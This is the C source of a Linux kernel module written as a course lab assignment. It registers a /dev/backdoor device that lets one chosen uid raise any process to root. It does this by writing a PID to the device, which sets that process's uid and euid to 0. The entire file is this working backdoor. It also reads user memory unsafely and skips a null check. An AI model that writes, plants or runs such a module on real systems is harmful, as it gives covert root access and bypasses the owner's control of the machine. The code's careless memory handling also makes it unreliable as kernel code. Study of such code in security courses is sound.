/**
 * CSC 453 Lab 5
 * Nathaniel "Nat" Welch
 * Creates a device /dev/backdoor which allows you to run things as root.
 *
 * This is based off of code from http://www.tldp.org/LDP/lkmpg/2.6/html/lkmpg.html
 * Section 4 and Section 7
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/unistd.h>
#include <asm/uaccess.h>

// Define who I am and what the liscense is.
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nat Welch <nat@natwelch.com>");
MODULE_DESCRIPTION("Adds a backdoor to the linux system.");

int init_module(void);
void cleanup_module(void);
static int backdoor_open(struct inode *, struct file *);
static int backdoor_release(struct inode *, struct file *);
static ssize_t backdoor_write(struct file *, const char *, size_t, loff_t *);

#define SUCCESS 0
#define DEVICE_NAME "backdoor"	/* Dev name as it appears in /proc/devices   */
#define BUF_LEN 80		/* Max length of the message from the device */

MODULE_SUPPORTED_DEVICE(DEVICE_NAME);

static int Major;		/* Major number assigned to our device driver */
static int Device_Open = 0;	/* Is device open? Used to prevent multiple access to device */

static struct file_operations fops = {
	.write = backdoor_write,
	.open = backdoor_open,
	.release = backdoor_release
};

static int approvedPid = 1000;
module_param(approvedPid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(approvedPid, " An integer containing the uid of the user allowed to take control.");

/*
 * This function is called when the module is loaded
 */
int init_module(void)
{
	Major = register_chrdev(0, DEVICE_NAME, &fops);

	if (Major < 0) {
		printk(KERN_ALERT "Registering char device failed with %d\n", Major);
		return Major;
	}

	printk(KERN_INFO "I was assigned major number %d. \n", Major);
	printk(KERN_INFO " mknod /dev/%s c %d 0\n", DEVICE_NAME, Major);
	printk(KERN_INFO "Only the user with uid %d can use the backdoor.\n", approvedPid);

	return SUCCESS;
}

/*
 * This function is called when the module is unloaded
 */
void cleanup_module(void)
{
	/* 
	 * Unregister the device 
	 */
	int ret = unregister_chrdev(Major, DEVICE_NAME);
	if (ret < 0)
		printk(KERN_ALERT "Error in unregister_chrdev: %d\n", ret);
}

/* 
 * Called when a process tries to open the device file
 */
static int backdoor_open(struct inode *inode, struct file *file)
{
	int caller = 0;
	struct task_struct *p = current;

	//caller = (int)file->f_uid;
	caller = (int)p->uid;

	if (Device_Open)
	{
		return -EBUSY;
	}
	else if(approvedPid != caller) 
	{
		//printk(KERN_ALERT "%d DOES NOT HAVE PERMISSION TO DO THIS.\n", file->f_uid);
		return -1;
	}
	else
	{
		Device_Open++;
		try_module_get(THIS_MODULE);

		//printk(KERN_ALERT "Someone has opened the backdoor\n");
	}

	return SUCCESS;
}

/* 
 * Called when a process closes the device file.
 */
static int backdoor_release(struct inode *inode, struct file *file)
{
	//printk(KERN_ALERT "Someone has closed the backdoor\n");
	Device_Open--;		/* We're now ready for our next caller */

	/* 
	 * Decrement the usage count, or else once you opened the file, you'll
	 * never get get rid of the module. 
	 */
	module_put(THIS_MODULE);

	return 0;
}


/*  
 * Called when a process writes to dev file: echo "hi" > /dev/hello 
 */
static ssize_t backdoor_write(struct file *filp, const char *buff, size_t len, loff_t * off)
{
	struct task_struct *p;
	int pid = 0;
	int i = 0;
	char temp[len];

	for(i = 0; i < len && i < BUF_LEN; i++)
	{
		temp[i] = buff[i];
	}

	sscanf(temp,"%d",&pid);

	//printk(KERN_ALERT "Tried to write %s to device, converted to %d.\n",temp,pid);

	if(pid > 0)
	{
		p = find_task_by_pid(pid);
		//printk(KERN_ALERT "Changing %d from user %d to 0.\n",p->pid,p->uid);
		p->uid = 0;
		//p->gid = 0; //Commenting out since fucks up bash
		p->euid = 0;
	}

	return len; 
}

